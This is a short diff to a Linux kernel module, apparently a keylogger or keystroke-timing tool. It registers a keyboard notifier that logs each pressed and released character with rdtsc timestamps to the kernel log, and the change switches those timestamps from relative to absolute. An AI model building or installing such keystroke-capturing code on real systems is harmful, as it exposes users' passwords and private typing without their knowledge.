@@ -64,7 +64,7 @@ static int keylogger_notify(struct notifier_block *nb, unsigned long action,
     if (param->down) {
       printk(KERN_INFO "{\'type\': \'press\', \'key-char\': \'%c\', "
                        "\'keystroke-time\': %llu}",
-             param->value - 64353 + 'a', t1 - start_time);
+             param->value - 64353 + 'a', t1);
       last_press = t1;
     } else {
       printk(KERN_INFO "{\'type\': \'release\', \'key-char\': \'%c\', "
@@ -80,7 +80,7 @@ static int __init my_module_init(void) {
   nb.notifier_call = keylogger_notify;
   register_keyboard_notifier(&nb);
   start_time = fenced_rdtsc();
-  printk(KERN_INFO "keylogging module loaded");
+  printk(KERN_INFO "keylogging module loaded successfully: %llu", start_time);
   return 0; // Success
 }
 
